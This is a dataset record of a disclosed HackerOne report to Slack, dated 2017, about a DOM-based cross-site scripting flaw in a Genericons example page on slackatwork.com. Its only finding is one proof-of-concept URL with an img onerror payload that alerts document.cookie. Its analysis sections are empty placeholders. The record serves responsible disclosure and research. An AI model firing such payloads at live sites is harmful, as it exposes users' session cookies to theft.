---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '196624'
original_report_id: '196624'
title: dom xss in https://www.slackatwork.com
weakness: Cross-site Scripting (XSS) - Generic
team_handle: slack
created_at: '2017-01-07T21:35:40.104Z'
disclosed_at: '2017-03-02T01:05:39.069Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 12
tags:
- hackerone
- cross-site-scripting-xss-generic
---

# dom xss in https://www.slackatwork.com

## Metadata

- HackerOne Report ID: 196624
- Weakness: Cross-site Scripting (XSS) - Generic
- Program: slack
- Disclosed At: 2017-03-02T01:05:39.069Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

https://www.slackatwork.com/wp-content/themes/twentyfifteen/genericons//example.html#1<img/ src=1 onerror= alert(document.cookie)>

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
